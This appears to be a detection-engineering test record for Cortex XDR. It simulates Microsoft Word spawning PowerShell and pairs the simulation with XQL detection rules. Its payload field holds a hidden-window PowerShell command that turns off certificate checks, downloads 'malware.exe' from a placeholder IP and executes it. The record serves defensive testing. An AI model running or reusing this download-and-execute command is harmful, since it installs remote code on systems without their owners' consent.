identity.summary: An attacker uses Microsoft Word to execute a malicious payload via a suspicious command-line argument, triggering the Cortex alert for Office process spawning with suspicious command-line arguments. T
identity.description: An attacker uses Microsoft Word to execute a malicious payload via a suspicious command-line argument, triggering the Cortex alert for Office process spawning with suspicious command-line arguments. The attack involves macro-enabled documents and PowerShell execution.

payload.code:
powershell.exe -WindowStyle Hidden -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object System.Net.WebClient; $client.DownloadFile('http://192.0.2.10/malware.exe', 'C:\Users\Public\malware.exe')"
start-process -FilePath "C:\Users\Public\malware.exe" -ArgumentList "-e JABzAHQAcgA="

expected_artifacts.description: Word process spawning with suspicious command-line arguments

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Office Process Spawned Suspicious CommandLine
biocs.description: Detection of Office process (e.g., winword.exe) launching a process with suspicious command-line arguments such as encoded PowerShell commands
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'winword.exe'
| filter action_process_image_name = 'powershell.exe' and action_command_line contains '-e'

abiocs.name: Suspicious Office Process Command-Line Behavior
abiocs.description: Detects a pattern where an Office application (e.g., Word) launches a process with encoded command-line arguments indicative of PowerShell execution
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'winword.exe'
| filter action_command_line contains '-e' and action_command_line contains 'powershell'

xql_queries.name: Office Process with Suspicious CommandLine Hunt
